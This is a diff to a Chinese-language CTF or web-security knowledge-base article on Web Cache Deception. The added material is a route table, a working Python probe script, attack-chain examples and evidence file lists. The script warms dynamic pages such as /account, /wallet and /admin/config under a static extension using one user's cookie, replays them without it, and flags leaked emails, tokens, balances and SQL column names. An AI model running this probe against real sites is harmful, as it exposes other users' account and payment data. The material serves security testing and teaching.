@@ -11,11 +11,11 @@ category: "08-infra"
 signals: ["web cache deception", "缓存欺骗", "CDN", "静态文件缓存", "path delimiter", "X-Cache"]
 mcp_tools: ["http_probe", "kb_router"]
 keywords: ["Web Cache Deception", "CDN缓存欺骗", "缓存投毒区别", "动态页面缓存", "路径分隔符绕过", "敏感数据泄露", "cache deception vs poisoning"]
-difficulty: "intermediate"
-tags: ["caching", "web-security", "ctf"]
+difficulty: "advanced"
+tags: ["caching", "cdn", "cache-deception", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: []
+related_articles: ["ctf-website/08-infra/race-cache-smuggling", "ctf-website/02-auth/host-header", "ctf-website/14-idor/01-idor-enumeration", "ctf-website/12-payment/payment-email-bounce-idor", "ctf-website/24-database/05-backup-log-leak"]
 ---
 # Web Cache Deception
 
@@ -28,6 +28,73 @@ GET /account/settings.css  → CDN 认为这是 CSS → 缓存
                             → 实际后端是 /account/settings → 动态页面
                             → 缓存中存了用户的个人信息
 ```
+
+### 0.1 动态资源到账户/订单/配置 Oracle
+
+Cache Deception 的核心不是扩展名 payload 多，而是找“后端仍按动态资源出内容、CDN 却按静态资源存副本”的路由。支付、订单、导出和配置页面优先，因为这些页面往往带用户态、金额、签名、下载 token 或 SQL 导出的文件名。
+
+| 动态路由 | 静态变体 | A 账号预热 marker | B/匿名复取信号 | 下一跳 |
+|---|---|---|---|---|
+| `/account`, `/me`, `/profile` | `.css`, `.json`, `;.css` | username、email、csrf | 复取到 A 的身份字段 | IDOR、CSWSH、session oracle |
+| `/orders/<id>`, `/invoice/<id>` | `.pdf`, `.json`, `.js` | orderId、amount、address | B 读到订单/发票 | payment-email-bounce-idor |
+| `/wallet`, `/payments`, `/checkout` | `.json`, `.txt`, `.ico` | balance、payToken、callback URL | 支付 token 或状态外泄 | payment logic、race lost update |
+| `/admin/config`, `/debug/env` | `.js`, `.map`, `.json` | API endpoint、bucket、dsn | 配置被共享缓存 | backup/log leak、SSRF |
+| `/export`, `/report`, `/download` | `.csv`, `.xlsx`, `.zip` | SQL 导出列名、文件名 | 下载 token 可复用 | SQLi/backup/log leak |
+
+```python
+# cache_deception_route_matrix.py
+import csv
+import hashlib
+import re
+import requests
+
+EXTS = [".css", ".js", ".json", ".ico", ".txt", ".pdf", ".csv"]
+DELIMS = ["", ";", "%3b", "/x", "%2fx", "..;", "/..;/"]
+MARKERS = [r"user(name)?", r"email", r"csrf", r"order", r"amount", r"balance", r"invoice", r"token", r"select|insert|update|sql"]
+
+def sig(text):
+    return hashlib.sha256(text[:8192].encode(errors="ignore")).hexdigest()[:16]
+
+def variants(path):
+    path = path.rstrip("/")
+    for ext in EXTS:
+        yield path + ext
+        for delim in DELIMS[1:]:
+            yield path + delim + ext
+
+def hit_markers(text):
+    joined = "|".join(MARKERS)
+    return ",".join(sorted(set(m.group(0).lower() for m in re.finditer(joined, text, re.I))))
+
+def probe(base, paths, cookie_a, out_csv="exports/cache_deception_route_matrix.csv"):
+    rows = []
+    s = requests.Session()
+    for path in paths:
+        for suffix in variants(path):
+            url = base.rstrip("/") + suffix
+            warm = s.get(url, headers={"Cookie": cookie_a}, timeout=10)
+            replay = s.get(url, timeout=10)
+            rows.append({
+                "url": url,
+                "warm_status": warm.status_code,
+                "replay_status": replay.status_code,
+                "warm_sig": sig(warm.text),
+                "replay_sig": sig(replay.text),
+                "same_body": sig(warm.text) == sig(replay.text),
+                "cache": replay.headers.get("X-Cache") or replay.headers.get("CF-Cache-Status") or "",
+                "age": replay.headers.get("Age", ""),
+                "content_type": replay.headers.get("Content-Type", ""),
+                "markers": hit_markers(replay.text),
+            })
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=list(rows[0]))
+        w.writeheader()
+        w.writerows(rows)
+
+probe("https://target", ["/account", "/orders/1001", "/wallet", "/payments", "/admin/config", "/export"], "session=ACCOUNT_A")
+```
+
+同时保存 `exports/deception_identity_diff.jsonl`：每条写入 A/B 身份、URL、cache header、body hash、命中的订单号/金额/token/SQL 列名。只看 `X-Cache: HIT` 不够，关键是 B/匿名复取是否拿到 A 预热留下的业务 marker。
 
 ## 基础 Payload
 
@@ -197,12 +264,16 @@ Cache Deception → /admin/config.js → 缓存管理配置 → API key 泄露
 Cache Deception → XSS payload 缓存 → Stored XSS on CDN → 全站攻击
 Cache Deception + delimiter → ;.css bypass → 绕过 URL 规范化 → 更多页面可缓存
 Cache Deception + crawl → 搜索爬虫 → CDN 预热恶意缓存 → 被动攻击
+Cache Deception → /orders/1001.json → 订单/发票复取 → 支付回调参数拼接
+Cache Deception → /export.csv → SQL 导出列名/where 条件泄露 → SQLi 字段字典
 ```
 
 ## Evidence
 
 - `deception_probes.json`: payload、A 账号预热响应、B/匿名复取响应、状态码、长度、hash。
 - `cache_headers.json`: `X-Cache`、`CF-Cache-Status`、`Age`、`Cache-Control`、`Vary`、`Content-Type`。
+- `cache_deception_route_matrix.csv`: 动态路由、静态变体、A/B hash、cache 命中、订单/支付/SQL marker。
+- `deception_identity_diff.jsonl`: A 身份预热与 B/匿名复取的字段差异，保留 orderId、amount、balance、token、列名。
 - `parser_matrix.csv`: delimiter、后端路由命中、CDN key、缓存命中、是否跨身份复取。
 - 成功样本: A 预热 `/account;.css` 后，B 无 cookie 读到 A 的账号字段或 flag。
 - 失败样本: B 只拿登录页、`Vary: Cookie` 生效、所有动态响应 `Cache-Control: private/no-store`。
